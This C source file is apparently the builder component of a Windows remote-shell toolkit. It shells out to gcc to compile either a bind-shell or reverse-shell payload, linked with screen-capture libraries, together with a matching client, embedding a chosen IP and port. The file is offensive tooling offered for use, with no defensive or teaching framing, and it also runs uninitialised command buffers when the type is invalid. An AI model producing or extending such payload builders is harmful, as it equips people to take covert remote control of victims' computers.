#include "shell.h"
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>

// Shell struct defined in .h file

void createShellExecutable(struct Shell shell) {
    char shellcmd[256];
    char clientcmd[256];

    system("mkdir output");

    // use gcc to create the shell executable with the correct params
    if (shell.type == 0){
        sprintf(shellcmd, "gcc -D PORT=%d -D IP=%s -o output/bshell.exe payloads/bindshell.c payloads/shellComm.c payloads/images.c -lgdiplus -lgdi32 -lws2_32", shell.port, shell.ip);
        sprintf(clientcmd, "gcc -D PORT=%d -D IP=%s -o output/bclient.exe clients/bindshell_client.c clients/clientComm.c -lws2_32", shell.port, shell.ip);
    }
    else if (shell.type == 1){
        sprintf(shellcmd, "gcc -D PORT=%d -D IP=%s -o output/rshell.exe payloads/reverseshell.c payloads/shellComm.c payloads/images.c -lgdiplus -lgdi32 -lws2_32", shell.port, shell.ip);
        sprintf(clientcmd, "gcc -D PORT=%d -D IP=%s -o output/rclient.exe clients/reverseshell_client.c clients/clientComm.c -lws2_32", shell.port, shell.ip);

    }
    else{
        printf("Invalid type.\n");
    }
    printf("Creating executable...\n");
    system(shellcmd);
    printf("Creating client...\n");
    system(clientcmd);

}



